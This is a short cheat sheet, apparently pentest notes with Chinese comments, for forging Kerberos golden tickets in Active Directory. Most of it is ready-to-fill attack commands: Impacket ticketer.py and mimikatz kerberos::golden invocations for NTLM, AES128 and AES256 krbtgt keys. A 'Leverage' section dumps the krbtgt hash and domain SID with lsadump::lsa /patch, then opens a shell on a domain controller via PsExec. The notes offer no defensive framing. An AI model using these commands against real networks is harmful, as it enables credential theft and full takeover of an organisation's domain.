- krbtgt NTLM
- Domain SID
### Impacket
```bash
 python3 ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
- python3 ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
```
### mimikatz

AES 256 Key:

 ```powershell
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name>
```

AES 128 Key: 

 ```powershell
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name>
```

NTLM:

```powershell
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<krbtgt_ntlm_hash> /user:<user_name>
```
# Leverage
```powershell 
   privilege::debug
   lsadump::lsa /patch #获取krbtgt hash && Domain SID
   
   kerberos::purge #清空内存票据
   #将当前进程的令牌提升为具有系统权限的令牌，然后使用该令牌创建一个新的命令提示符进程。
   misc::cmd
   PsExec.exe \\dc1 cmd.exe
```
*使用域名而不是IP地址以触发Kerberos认证*
`psexec.exe \\192.168.50.70 cmd.exe` is Denied

